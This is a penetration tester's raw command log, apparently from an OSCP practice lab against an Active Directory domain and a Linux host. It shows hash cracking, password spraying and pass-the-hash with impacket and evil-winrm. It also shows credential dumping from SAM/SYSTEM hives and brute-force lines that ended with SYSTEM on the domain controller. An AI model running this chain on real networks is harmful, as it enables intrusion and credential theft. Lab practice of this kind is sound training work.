+KERBEROS: 
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-07 01:53:19Z)
+
+LDAP: 
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+
+HTTP: 
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+RPC: 
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49705/tcp open  msrpc         syn-ack Microsoft Windows RPC
+62033/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 21439/tcp): CLEAN (Timeout)
+|   Check 2 (port 17012/tcp): CLEAN (Timeout)
+|   Check 3 (port 17259/udp): CLEAN (Timeout)
+|   Check 4 (port 18410/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: -3s
+| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:46:2f (VMware)
+| Names:
+|   DC01<20>             Flags: <unique><active>
+|   DC01<00>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+|   OSCP<1c>             Flags: <group><active>
+|   OSCP<1b>             Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:46:2f:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-05-07T01:54:15
+|_  start_date: N/A
+
+464/tcp   open  kpasswd5?     syn-ack
+636/tcp   open  tcpwrapped    syn-ack
+3269/tcp  open  tcpwrapped    syn-ack
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+
+
+sudo nmap -sU -O 10.10.206.140
+
+				ASREP ROAST: 
+celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd
+Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-GetNPUsers -dc-ip 10.10.206.140 -outputfile hashes.asreproast -request oscp.exam/celia.almeda
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+Password: e728ecbadfb02f51ce8eed753f3ff3fd
+[*] Cannot authenticate celia.almeda, getting its TGT
+[-] User celia.almeda doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-GetNPUsers -dc-ip 10.10.206.140 -outputfile hashes.asreproast -request oscp.exam/Mary.Williams
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+Password:
+[*] Cannot authenticate Mary.Williams, getting its TGT
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-GetNPUsers -dc-ip 10.10.206.140 -outputfile hashes.asreproast -request oscp.exam/Administrator
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+Password: 3c4495bbd678fac8c9d218be4f2bbc7b
+[*] Cannot authenticate Administrator, getting its TGT
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+
+				SPRAY AND PRAY:
+celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd
+Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+
+SMB: 
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.140 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd --shares
+SMB         10.10.206.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.206.140   445    DC01             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 
+SMB         10.10.206.140   445    DC01             [+] Enumerated shares
+SMB         10.10.206.140   445    DC01             Share           Permissions     Remark
+SMB         10.10.206.140   445    DC01             -----           -----------     ------
+SMB         10.10.206.140   445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.206.140   445    DC01             C$                              Default share
+SMB         10.10.206.140   445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.206.140   445    DC01             NETLOGON        READ            Logon server share                                                                                            
+SMB         10.10.206.140   445    DC01             SYSVOL          READ            Logon server share                                                                                            
+SMB         10.10.206.140   445    DC01             Users           READ  
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.140 -u Mary.Williams -H 9a3121977ee93af56ebd0ef4f527a35e --shares
+SMB         10.10.206.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.206.140   445    DC01             [-] oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e STATUS_LOGON_FAILURE 
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.140 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --shares
+SMB         10.10.206.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.206.140   445    DC01             [-] oscp.exam\Administrator:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE 
+
+WINRM: 
+
+
+				FOOTHOLD: Access
+10.10.206.140 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd 
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.206.140
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+[*] Requesting shares on 10.10.206.140.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+[-] share 'Users' is not writable.
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-smbclient celia.almeda@10.10.206.140
+
+
+
+--------------------------------------------------------------------------------------------------
+				10.10.206.142
+HTTP: 5985 47001
+MSSQL: 49700
+RPC: 135
+SMB: 139 445
+???: 5040
+
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.206.142
+
+HTTP: 5985 47001
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+MSSQL: 49700
+49700/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2024-05-07T02:02:55+00:00; -2s from scanner time.
+| ms-sql-ntlm-info: 
+|   10.10.206.142:49700: 
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+|_    Product_Version: 10.0.19041
+| ms-sql-info: 
+|   10.10.206.142:49700: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 49700
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-30T08:45:56
+| Not valid after:  2054-03-30T08:45:56
+| MD5:   c48b:8dc6:357d:7951:2193:92c4:a4e7:fa40
+| SHA-1: dc6d:2ab1:5046:54eb:e8cc:929a:29a0:f441:997f:76df
+
+RPC: 135
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 139 445
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 19492/tcp): CLEAN (Timeout)
+|   Check 2 (port 35276/tcp): CLEAN (Timeout)
+|   Check 3 (port 62276/udp): CLEAN (Timeout)
+|   Check 4 (port 24193/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-07T02:02:15
+|_  start_date: N/A
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+| nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:52:69 (VMware)
+| Names:
+|   MS02<00>             Flags: <unique><active>
+|   MS02<20>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+| Statistics:
+|   00:50:56:ab:52:69:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+
+5040/tcp  open  unknown       syn-ack
+
+
+sudo nmap -sU -O 10.10.206.142
+
+
+				SPRAY AND PRAY:
+celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd
+Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+
+SMB:
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd --shares
+SMB         10.10.206.142   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.206.142   445    MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 
+SMB         10.10.206.142   445    MS02             [+] Enumerated shares
+SMB         10.10.206.142   445    MS02             Share           Permissions     Remark
+SMB         10.10.206.142   445    MS02             -----           -----------     ------
+SMB         10.10.206.142   445    MS02             ADMIN$                          Remote Admin
+SMB         10.10.206.142   445    MS02             C$                              Default share
+SMB         10.10.206.142   445    MS02             IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.142 -u Mary.Williams -H 9a3121977ee93af56ebd0ef4f527a35e --shares
+SMB         10.10.206.142   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.206.142   445    MS02             [-] oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e STATUS_LOGON_FAILURE 
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ crackmapexec smb 10.10.206.142 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --shares
+SMB         10.10.206.142   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.206.142   445    MS02             [-] oscp.exam\Administrator:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE 
+
+
+WINRM: 
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.206.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam --continue-on-success
+HTTP        10.10.206.142   5985   10.10.206.142    [*] http://10.10.206.142:5985/wsman
+WINRM       10.10.206.142   5985   10.10.206.142    [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+
+
+					FOOTHOLD: Access
+SMB:
+10.10.206.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+SMB         10.10.206.142   445    MS02             IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.206.142
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+[*] Requesting shares on 10.10.206.142.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ impacket-smbclient celia.almeda@10.10.206.142 
+
+smbclient -U 'celia.almeda' -P "e728ecbadfb02f51ce8eed753f3ff3fd" \\\\10.10.206.142\\IPC$ 
+smbmap -u 'celia.almeda' -p 'e728ecbadfb02f51ce8eed753f3ff3fd' -H 10.10.206.142 
+
+
+WINRM: 
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ evil-winrm -i 10.10.206.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
+oscp\celia.almeda
+
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> hostname
+MS02
+
+
+					BASIC INFO:
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
+oscp\celia.almeda
+
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> hostname
+MS02
+
+					NETWORK: ONLY CONNECTED INTERNALLY 
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : MS02
+   Primary Dns Suffix  . . . . . . . : oscp.exam
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : oscp.exam
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-52-69
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.206.142(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.206.254
+   DNS Servers . . . . . . . . . . . : 10.10.206.140
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+
+					PRIV ESC: 
+*Evil-WinRM* PS C:\Users\celia.almeda\Desktop> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+
+			TRYING TO UPLOAD FILES FROM KILI TO MS01 DIDNT WORK 
+
+					TUNNEL: to MS01
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b Administrator@10.10.206.141
+
+C:\Windows\system32> powershell -ep bypass
+
+python3 -m http.server 5985
+python -m SimpleHTTPServer 5985
+php -S 0.0.0.0:5985
+ruby -run  -e -httpd . -p 5985
+python : The term 'python' is not recognized as the name of a cmdlet, function, script file, or operable program. 
+
+
+					CREDS: 0
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> upload LaZagne.exe
+Info: Uploading /home/kali/Desktop/WINDOWS-PRIV/LaZagne.exe to C:\Users\celia.almeda\Documents\LaZagne.exe
+Data: 15798992 bytes of 15798992 bytes copied
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> .\LaZagne.exe all
+[+] 0 passwords have been found.
+
+
+				Sam, System, Security Files: 
+	https://github.com/xsudoxx/OSCP?tab=readme-ov-file#sam-system-security-files
+
+*Evil-WinRM* PS C:\Windows\System32\config> ls
+Access to the path 'C:\Windows\System32\config' is denied.
+    + CategoryInfo          : PermissionDenied: (C:\Windows\System32\config:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+*Evil-WinRM* PS C:\Windows\System32\config> download SYSTEM
+Info: Downloading C:\Windows\System32\config\SYSTEM to SYSTEM
+Error: Download failed. Check filenames or paths
+
+# FOUND windows.old in C:\: 
+
+*Evil-WinRM* PS C:\windows.old\Windows\System32> ls
+-a----          4/4/2022   6:00 AM          57344 SAM
+-a----          4/4/2022   6:00 AM       11636736 SYSTEM
+
+*Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM 
+Info: Downloading C:\windows.old\Windows\System32\SAM to SAM
+Info: Download successful!
+
+*Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM
+Info: Downloading C:\windows.old\Windows\System32\SYSTEM to SYSTEM
+Info: Download successful!
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ samdump2 SYSTEM SAM   
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ creddump7 
+creddump7 - Python tool to extract credentials and secrets from Windows registry hives
+/usr/share/creddump7
+├── cachedump.py
+├── framework
+├── lsadump.py
+├── pwdump.py
+└── __pycache__
+
+┌──(kali㉿kali)-[/usr/share/creddump7]
+└─$ ls
+cachedump.py  framework  lsadump.py  pwdump.py  __pycache__
+
+┌──(kali㉿kali)-[~/Desktop/A/141/140]
+└─$ pwd                        
+/home/kali/Desktop/A/141/140
+
+┌──(kali㉿kali)-[/usr/share/creddump7]
+└─$ ./pwdump.py /home/kali/Desktop/A/141/140/SYSTEM /home/kali/Desktop/A/141/140/SAM
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
+David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
+Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
+
+				SPRAY AND PRAY:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
+David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
+Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
+
+SMB: 
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.206.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc --shares
+SMB         10.10.206.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.206.140   445    DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
+SMB         10.10.206.140   445    DC01             [+] Enumerated shares
+SMB         10.10.206.140   445    DC01             Share           Permissions     Remark
+SMB         10.10.206.140   445    DC01             -----           -----------     ------
+SMB         10.10.206.140   445    DC01             ADMIN$          READ,WRITE      Remote Admin
+SMB         10.10.206.140   445    DC01             C$              READ,WRITE      Default share
+SMB         10.10.206.140   445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.206.140   445    DC01             NETLOGON        READ,WRITE      Logon server share 
+SMB         10.10.206.140   445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.206.140   445    DC01             Users           READ,WRITE  
+
+WINRM: 
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.206.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam --continue-on-success
+HTTP        10.10.206.140   5985   10.10.206.140    [*] http://10.10.206.140:5985/wsman
+WINRM       10.10.206.140   5985   10.10.206.140    [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
+
+
+				ACCESS:
+SMB:                                                                                 
+┌──(kali㉿kali)-[/usr/share/creddump7]
+└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.206.140
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.206.140.....
+[*] Found writable share ADMIN$
+[*] Uploading file WSLpsqmM.exe
+[*] Opening SVCManager on 10.10.206.140.....
+[*] Creating service MOeh on 10.10.206.140.....
+[*] Starting service MOeh.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+DC01
+
+C:\Users> powershell -ep bypass
+
+PS C:\Users\Administrator\Desktop> cat proof.txt
+5a248da0e4800f6f016939b3addc209b
+
+PS C:\Users\Administrator\Desktop> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.206.140
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.206.254
+
+
+--------------------------------------------------------------------------------------------------
+				Aero: 192.168.225.143
+NMAP: 
+- FTP:21, 
+- SSH:22, 
+- HTTP:80,81,443
+- mysql: 3306
+- postgresql: 5432
+
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.225.143
+
+21/tcp   open  ftp        syn-ack vsftpd 3.0.3
+
+22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi/7Md8C4Np6BJgxvw5Jb8jJ+RYx+s7Wc7jWxTHhTMURFOTc6HH2XC0rvbZukvws+KficflBsI/B7RVgY454RK1NOGOqVd5FSIY3qol4MGH2/Sq03mfjcc8aMgni5OZd2DNZY7e8auGa3fDOci6PXOZaYxwwjn52Vt/iNZu8sAv3rf1sRLAikvk5fGlEbxLu1+zXDCySqP0IgeR+i7JcWUp8+xiwp2ZmURcAsFkM0TBm07MJKD+T+zPru2YxvsICXMMG37rV22KFqmk2p/8PF18WUqJpDPnPYEKZwGjbxa71STgQfUcFXeXU9QX3ofz/g0ZpxEg8wk2O9fNvYdZ454isgPWtxhHe9wii18eq4DBizwfHao1OI8iKpPbkQlrKmOrPqU55LXJR84n68cCPp8yH8Pd8Mv+AzV+9h0/u72XB/0AaFcgT5u7SnGoiTrx5e2eMzI+lFkm5xY+KJw5ZvTaC3MnD3LJugV6axmAH+9L6LDrLV8dkLq6kV8KpS9Ej0=
+|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLKaSNQY+Y3BFhxGXMm8uTdQnXJ1VbZEwFMoa1MUkYgu0vSwafvy6ffXVglWIlroS4axopq6HkpSA+2wnjp2E8s=
+|   256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC3D5QMyrcUNcOicavOsnzna2L1/Fg2N7w7okmegpssB
+
+80/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+81/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+
+443/tcp  open  http       syn-ack Apache httpd 2.4.41
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+
+3306/tcp open  mysql      syn-ack MySQL (unauthorized)
+
+5432/tcp open  postgresql syn-ack PostgreSQL DB 9.6.0 or later
+| ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+| Issuer: commonName=aero
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-10T22:20:48
+| Not valid after:  2031-05-08T22:20:48
+| MD5:   0cbe:58c4:2d38:4109:72c9:e3c4:fe39:ca8d
+| SHA-1: ad85:4984:c180:ba73:e010:83f8:c44f:18b9:d176:2fd8
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   Kerberos: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 27265.28208: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2113
+|     RProcessStartupPacket
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2113
+|     RProcessStartupPacket
+|   ZendJavaBridge: 
+|_    EFATAL: unsupported frontend protocol 0.0: server supports 2.0 to 3.0
+
+3000/tcp open  ppp?       syn-ack
+3001/tcp open  nessus?    syn-ack
+3003/tcp open  cgms?      syn-ack
+
+
+					FTP:21, 
+ftp 192.168.225.143
+anonymous:anonymous
+hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
+
+					SSH:22, 
+ssh @192.168.225.143
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.162.201
+
+					mysql: 3306
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.225.143
+
+3306/tcp open  mysql   MySQL (unauthorized)
+| mysql-enum: 
+|   Accounts: No valid accounts found
